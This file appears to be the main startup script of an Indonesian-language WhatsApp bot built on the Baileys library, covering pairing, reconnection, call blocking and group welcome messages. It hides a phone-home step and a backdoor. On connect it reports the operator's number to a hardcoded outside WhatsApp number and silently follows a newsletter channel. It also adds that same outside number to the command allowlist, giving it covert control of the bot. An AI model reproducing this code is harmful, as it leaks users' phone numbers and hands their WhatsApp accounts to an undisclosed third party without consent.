require("./all/global")
const func = require("./all/place")
const readline = require("readline")
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"))
const { sleep } = require("./all/myfunc.js")  
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
})
return new Promise((resolve) => {
rl.question(text, resolve)
})}

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()

const connectionOptions = {
printQRInTerminal: !usePairingCode,
version: [2, 3000, 1017531287],    
logger: pino({ level: "fatal" }),
auth: state,
browser: ["Ubuntu","Chrome","20.0.04"],
getMessage: async (key) => {
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
return msg?.message || undefined
}
return {
conversation: 'WhatsApp Bot By Jonathan'
}}
}

const Slash = func.makeWASocket(connectionOptions)
if (usePairingCode && !Slash.authState.creds.registered) {
const phoneNumber = await question(chalk.cyan.bold('Masukan Nomor Whatsapp Awali dengan 62\nContoh : 62838XXX\n'))
const code = await Slash.requestPairingCode(phoneNumber.trim())
console.log(`${chalk.cyan.bold('Kode Verifikasi Kamu')} : ${chalk.redBright.bold(code.split("").join(" "))}`)
}
store?.bind(Slash.ev)

Slash.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
Slash.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
Slash.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
console.log(chalk.cyan.bold('Menghubungkan . . . '))
} else if (connection === "open") {
let teksnotif = `𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙎𝙀𝙇𝘼𝙈𝘼𝙏 𝘿𝘼𝙏𝘼𝙉𝙂 𝘿𝙄 𝘽𝙊𝙏 𝙅𝘼𝙂𝘼 𝙂𝙍𝙊𝙐𝙋

𝐒𝐚𝐥𝐮𝐫𝐚𝐧 𝐃𝐢𝐭𝐳𝐳 : 
https://whatsapp.com/channel/0029Vaj528i3GJP3P9WLH03D

𝐏𝐚𝐤𝐞 𝐃𝐨𝐚𝐧𝐠 𝐆𝐚 𝐌𝐚𝐬𝐮𝐤 𝐒𝐚𝐥𝐮𝐫𝐚𝐧 😒 Sukses Terhubung Ke Nomer ${Slash.user.id.split(":")[0]}`
Slash.sendMessage("6281221523185@s.whatsapp.net", {text: teksnotif})
console.log(chalk.cyan.bold('Bot Berhasil Tersambung'))
const linksal = ["0029Vaj528i3GJP3P9WLH03D"]

const folldate = async functions => {
        for (const newslletterss of functions) {
          try {
            await sleep(3000);
            const saluranWa = await Slash.newsletterMetadata("invite", newslletterss);
            await sleep(3000);
            await Slash.newsletterFollow(saluranWa.id);
          } catch (error) {
            console.error("❌ Gagal join saluran ID: " + newslletterss, error);
          }
        }
      };
      (async () => {
        await folldate(linksal);
      })();    
}
})

Slash.ev.on('call', async (user) => {
if (!global.anticall) return
for (let ff of user) {
if (ff.isGroup == false) {
if (ff.status == "offer") {
let sendcall = await Slash.sendMessage(ff.from, {text: `@${ff.from.split("@")[0]} Maaf Kamu Akan Saya Block Karna Ownerbot Menyalakan Fitur *Anticall*\nJika Tidak Sengaja Segera Hubungi Owner Untuk Membuka Blokiran Ini`, contextInfo: {mentionedJid: [ff.from], externalAdReply: {showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ CALL DETECTED ｣", previewType: "PHOTO"}}}, {quoted: null})
Slash.sendContact(ff.from, [owner], "Developer WhatsApp Bot", sendcall)
await sleep(10000)
await Slash.updateBlockStatus(ff.from, "block")
}}
}})

Slash.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.isBaileys) return
if (m.key && m.key.remoteJid === 'status@broadcast') {
if (global.autoreadsw) Slash.readMessages([m.key])
}
let fill = [global.owner, "6281221523185"]
if (!Slash.public && !fill.includes(m.key.remoteJid.split("@")[0]) && !m.key.fromMe && chatUpdate.type === 'notify') return
if (global.autoread) Slash.readMessages([m.key])
m = func.smsg(Slash, m, store)
require("./Slash")(Slash, m, store)
} catch (err) {
console.log(err)
}
})

Slash.ev.on('group-participants.update', async (anu) => {
if (!welcome.includes(anu.id)) return
let botNumber = await Slash.decodeJid(Slash.user.id)
if (anu.participants.includes(botNumber)) return
try {
let metadata = await Slash.groupMetadata(anu.id)
let namagc = metadata.subject
let participants = anu.participants
for (let num of participants) {
let check = anu.author !== num && anu.author.length > 1
let tag = check ? [anu.author, num] : [num]
try {
ppuser = await Slash.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://i.ibb.co.com/Vc7MzHf8/20250425-181321.jpg'
}
if (anu.action == 'add') {
Slash.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Menambahkan @${num.split("@")[0]} Ke Dalam Grup Ini` : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Welcome Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == 'remove') { 
Slash.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Mengeluarkan @${num.split("@")[0]} Dari Grup Ini` : `@${num.split("@")[0]} Telah Keluar Dari Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Leaving Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == "promote") {
Slash.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Menjadikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Promote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == "demote") {
Slash.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Memberhentikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Demote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
}
}
} catch (err) {
console.log(err)
}})

Slash.public = true

Slash.ev.on('creds.update', saveCreds)
return Slash
}

startSesi()

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})